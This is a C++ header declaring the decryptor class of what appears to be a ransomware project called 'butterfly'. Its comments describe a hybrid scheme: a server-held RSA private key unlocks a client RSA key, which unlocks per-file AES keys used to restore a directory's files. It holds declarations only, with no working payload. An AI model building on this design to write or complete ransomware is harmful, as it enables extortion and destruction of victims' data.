
#ifndef BUTTERFLY_DECRYPTOR_H
#define BUTTERFLY_DECRYPTOR_H

#include "crypto/rsaDecryptor.h"
#include "crypto/aesDecryptor.h"
#include "directoryIterator.h"
#include "aesKeyDatabase.h"
#include "params.h"
#include "exceptions.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Decryptor to decrypt all files with AES and the CPrivateRSA as well as AES Key/IV with RSA
 */
class Decryptor
{

private:
    std::string _decryptedCPrivateRSA, _aesKeyDbFilepath;

    std::unique_ptr<rsa::RSADecryptor> _rsaDecryptorCPrivateRSA;
    std::unique_ptr<aes::AESDecryptor> _aesDecryptor;
    std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;

    /**
     * Removes decrypted files from system
     */
    static void removeDecryptedFiles();

public:

    /**
     * Constructor Decryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
     *       decryptor->invokeDir("/home/", "SPrivateRSA.pem");
     *
     * @param aesKeyDbFilepath:
     */
    explicit Decryptor(const std::string &aesKeyDbFilepath = "AES.db");

    /**
     * Destructor Decryptor
     */
    ~Decryptor() = default;

    /**
     * Invokes the directory to start the decryption process
     *
     * @param dirPath: path to the directory
     * @param pkeyFromServer: SPrivateRSA.pem from server (corresponds to the embedded SPublicKey.pem)
     */
    void invokeDir(const std::string &dirPath, const std::string &pkeyFromServer);

    /**
     * Decrypt the CPrivateRSA.bin file
     *
     * @param pkeyFromServer: SPrivateRSA.pem from server (corresponds to the embedded SPublicKey.pem)
     * @param encCPrivateRSAFile: encrypted CPrivateRSA.bin file
     */
    void decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile);

    /**
     * Decrypts the AESKey.bin file to be able to get the decrypted AESKEY/AESIV
     *
     * @param filepathAESKey: path to the AESKey.bin
     * @param decAESKey: decrypted AESKey string
     * @param decAESIV: decrypted AESIV string
     */
    void decryptAESKeyPair(const std::string &filepathAESKey, std::string &decAESKey,  std::string &decAESIV);

    /**
     * Decrypt the file with the AES Key/IV pair
     *
     * @param filepath: path to the file
     * @param aesKey: aes key for the file to decrypt
     * @param aesIV: aes iv for the file to decrypt
     */
    void decryptFileWithAES(const std::string &filepath, std::string &aesKey, std::string &aesIV);

};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_DECRYPTOR_H
